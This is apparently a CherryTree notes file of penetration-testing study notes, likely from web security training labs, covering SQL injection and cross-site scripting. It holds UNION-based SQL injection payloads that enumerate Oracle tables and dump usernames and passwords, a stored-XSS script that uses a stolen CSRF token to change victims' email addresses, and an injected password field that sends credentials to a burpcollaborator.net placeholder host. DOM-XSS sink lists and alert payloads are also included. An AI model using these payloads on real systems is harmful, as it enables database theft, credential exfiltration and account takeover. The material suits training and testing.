<?xml version="1.0" ?>
<cherrytree>
	<bookmarks list=""/>
	<node custom_icon_id="0" foreground="" is_bold="False" name="SQL Injection" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1601615138.0" ts_lastsave="1601718116.0" unique_id="1">
		<rich_text></rich_text>
		<node custom_icon_id="0" foreground="" is_bold="False" name="Querying the database" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1601615225.0" ts_lastsave="1601615232.0" unique_id="2">
			<rich_text justification="left"></rich_text>
			<codebox char_offset="0" frame_height="100" frame_width="500" highlight_brackets="False" show_line_numbers="False" syntax_highlighting="sql" width_in_pixels="False">Microsoft, MySQL	SELECT @@version
Oracle	SELECT * FROM v$version
PostgreSQL	SELECT version()</codebox>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="Union attack" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1601707227.0" ts_lastsave="1601707363.0" unique_id="3">
			<rich_text>// Verify the table returns two columns when querying
'+UNION+SELECT+'abc','def'--

</rich_text>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="String Concat" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1601707512.0" ts_lastsave="1601707513.0" unique_id="4">
			<rich_text>
</rich_text>
			<rich_text scale="h2">String concatenation</rich_text>
			<rich_text>
                     You can concatenate together multiple strings to make a single string.         
        </rich_text>
			<rich_text justification="left"></rich_text>
			<rich_text>
</rich_text>
			<table char_offset="131" col_max="400" col_min="400">
				<row>
					<cell>Microsoft</cell>
					<cell>'foo'+'bar'</cell>
				</row>
				<row>
					<cell>PostgreSQL</cell>
					<cell>'foo'||'bar'</cell>
				</row>
				<row>
					<cell>MySQL</cell>
					<cell>'foo' 'bar' [Note the space between the two strings]
                    CONCAT('foo','bar')</cell>
				</row>
				<row>
					<cell>Oracle</cell>
					<cell>'foo'||'bar'</cell>
				</row>
			</table>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="Substring" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1601707530.0" ts_lastsave="1601707531.0" unique_id="5">
			<rich_text>
</rich_text>
			<rich_text scale="h2">Substring</rich_text>
			<rich_text>
                     You can extract part of a string, from a specified offset  with a specified length. Note that the offset index is 1-based. Each of  the following expressions will return the string </rich_text>
			<rich_text family="monospace">ba</rich_text>
			<rich_text>.         
        </rich_text>
			<rich_text justification="left"></rich_text>
			<rich_text>
</rich_text>
			<table char_offset="234" col_max="400" col_min="400">
				<row>
					<cell>Microsoft</cell>
					<cell>SUBSTRING('foobar', 4, 2)</cell>
				</row>
				<row>
					<cell>PostgreSQL</cell>
					<cell>SUBSTRING('foobar', 4, 2)</cell>
				</row>
				<row>
					<cell>MySQL</cell>
					<cell>SUBSTRING('foobar', 4, 2)</cell>
				</row>
				<row>
					<cell>Oracle</cell>
					<cell>SUBSTR('foobar', 4, 2)</cell>
				</row>
			</table>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="Comments" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1601707549.0" ts_lastsave="1601707550.0" unique_id="6">
			<rich_text>
</rich_text>
			<rich_text scale="h2">Comments</rich_text>
			<rich_text>
                     You can use comments to truncate a query and remove the portion of the original query that follows your input.         
        </rich_text>
			<rich_text justification="left"></rich_text>
			<rich_text>
</rich_text>
			<table char_offset="159" col_max="400" col_min="400">
				<row>
					<cell>Microsoft</cell>
					<cell>--comment
                    /*comment*/</cell>
				</row>
				<row>
					<cell>PostgreSQL</cell>
					<cell>--comment
                    /*comment*/</cell>
				</row>
				<row>
					<cell>MySQL</cell>
					<cell>#comment
                    -- comment [Note the space after the double dash]
                    /*comment*/</cell>
				</row>
				<row>
					<cell>Oracle</cell>
					<cell>--comment</cell>
				</row>
			</table>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="Db Version" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1601707566.0" ts_lastsave="1601707567.0" unique_id="7">
			<rich_text>
</rich_text>
			<rich_text scale="h2">Database version</rich_text>
			<rich_text>
                     You can query the database to determine its type and  version. This information is useful when formulating more complicated  attacks.         
        </rich_text>
			<rich_text justification="left"></rich_text>
			<rich_text>
</rich_text>
			<table char_offset="190" col_max="400" col_min="400">
				<row>
					<cell>Microsoft</cell>
					<cell>SELECT @@version</cell>
				</row>
				<row>
					<cell>PostgreSQL</cell>
					<cell>SELECT version()</cell>
				</row>
				<row>
					<cell>MySQL</cell>
					<cell>SELECT @@version</cell>
				</row>
				<row>
					<cell>Oracle</cell>
					<cell>SELECT banner FROM v$version
                    SELECT version FROM v$instance</cell>
				</row>
			</table>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="DB contents" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1601707622.0" ts_lastsave="1601707623.0" unique_id="9">
			<rich_text>
</rich_text>
			<rich_text scale="h2">Database contents</rich_text>
			<rich_text>
                     You can list the tables that exist in the database, and the columns that those tables contain.         
        </rich_text>
			<rich_text justification="left"></rich_text>
			<rich_text>
</rich_text>
			<table char_offset="152" col_max="400" col_min="400">
				<row>
					<cell>Microsoft</cell>
					<cell>SELECT * FROM information_schema.tables
                    SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'</cell>
				</row>
				<row>
					<cell>PostgreSQL</cell>
					<cell>SELECT * FROM information_schema.tables
                    SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'</cell>
				</row>
				<row>
					<cell>MySQL</cell>
					<cell>SELECT * FROM information_schema.tables
                    SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'</cell>
				</row>
				<row>
					<cell>Oracle</cell>
					<cell>SELECT * FROM all_tables
                    SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'</cell>
				</row>
			</table>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="Oracle list contents" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1601708662.0" ts_lastsave="1601708883.0" unique_id="10">
			<rich_text>//This query below is to list all the tables from the oracle DB

'+UNION+SELECT+</rich_text>
			<rich_text foreground="#ffffffff0000">table_name</rich_text>
			<rich_text>,</rich_text>
			<rich_text foreground="#ffffffff0000">NULL</rich_text>
			<rich_text>+FROM+</rich_text>
			<rich_text foreground="#ffffffff0000">all_tables</rich_text>
			<rich_text>-- 

//To display all the columns from a particular table use the below query 

'+UNION+SELECT+</rich_text>
			<rich_text foreground="#ffffffff0000">column_name</rich_text>
			<rich_text>,</rich_text>
			<rich_text foreground="#ffffffff0000">NULL</rich_text>
			<rich_text>+FROM+</rich_text>
			<rich_text foreground="#ffffffff0000">all_tab_columns</rich_text>
			<rich_text>+WHERE+table_</rich_text>
			<rich_text foreground="#ffffffff0000">name</rich_text>
			<rich_text>='USERS_PFGCGA'--

//This to fetch info from a table using the grabbed column names

'+UNION+SELECT+</rich_text>
			<rich_text foreground="#ffffffff0000">USERNAME_YJHDLP</rich_text>
			<rich_text>,+</rich_text>
			<rich_text foreground="#ffffffff0000">PASSWORD_QDNWSZ</rich_text>
			<rich_text>+FROM+</rich_text>
			<rich_text foreground="#ffffffff0000">USERS_PFGCGA</rich_text>
			<rich_text>--
</rich_text>
		</node>
	</node>
	<node custom_icon_id="0" foreground="" is_bold="False" name="Cross Site Scripting" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1601718116.0" ts_lastsave="1601718167.0" unique_id="11">
		<rich_text></rich_text>
		<node custom_icon_id="0" foreground="" is_bold="False" name="Stored XSS" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1601718145.0" ts_lastsave="1601718749.0" unique_id="12">
			<rich_text>//This exploit is entered in the comment section so who ever views this page will execute JS code
// Whoever views this page their email is automatically been changed to test@test.com

</rich_text>
			<rich_text justification="left"></rich_text>
			<rich_text>
This script will make anyone who views the comment issue a POST request to burpcollaborator.net containing their username and password. 

</rich_text>
			<rich_text justification="left"></rich_text>
			<codebox char_offset="185" frame_height="220" frame_width="815" highlight_brackets="False" show_line_numbers="False" syntax_highlighting="js" width_in_pixels="False">&lt;script&gt;
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/email',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name=&quot;csrf&quot; value=&quot;(\w+)&quot;/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/email/change-email', true);
    changeReq.send('csrf='+token+'&amp;email=test@test.com')
};
&lt;/script&gt; </codebox>
			<codebox char_offset="325" frame_height="160" frame_width="755" highlight_brackets="False" show_line_numbers="False" syntax_highlighting="js" width_in_pixels="False">&lt;input name=username id=username&gt;
&lt;input type=password name=password onchange=&quot;if(this.value.length)fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});&quot;&gt; </codebox>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="Reflected XSS" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1601718156.0" ts_lastsave="1601718156.0" unique_id="13">
			<rich_text></rich_text>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="DOM XSS" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1601718167.0" ts_lastsave="1601905620.0" unique_id="14">
			<rich_text> The following are some of the main sinks that can lead to DOM-XSS vulnerabilities:

document.write()
document.writeln()
document.domain
someDOMElement.innerHTML
someDOMElement.outerHTML
someDOMElement.insertAdjacentHTML
someDOMElement.onevent

 The following jQuery functions are also sinks that can lead to DOM-XSS vulnerabilities:

add()
after()
append()
animate()
insertAfter()
insertBefore()
before()
html()
prepend()
replaceAll()
replaceWith()
wrap()
wrapInner()
wrapAll()
has()
constructor()
init()
index()
jQuery.parseHTML()
$.parseHTML()

Common sources

The following are typical sources that can be used to exploit a variety of taint-flow vulnerabilities:

document.URL
document.documentURI
document.URLUnencoded
document.baseURI
location
document.cookie
document.referrer
window.name
history.pushState
history.replaceState
localStorage
sessionStorage
IndexedDB (mozIndexedDB, webkitIndexedDB, msIndexedDB)
Database </rich_text>
			<node custom_icon_id="0" foreground="" is_bold="False" name="Payload" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1601905616.0" ts_lastsave="1601914292.6" unique_id="15">
				<rich_text>Payload 

&lt;img src=1 onload=alert(1) /&gt;

//Angular JS payload
{{constructor.constructor('alert(1)')()}}

&lt;&gt;&lt;img src=1 onerror=alert(1)&gt; </rich_text>
			</node>
		</node>
	</node>
</cherrytree>
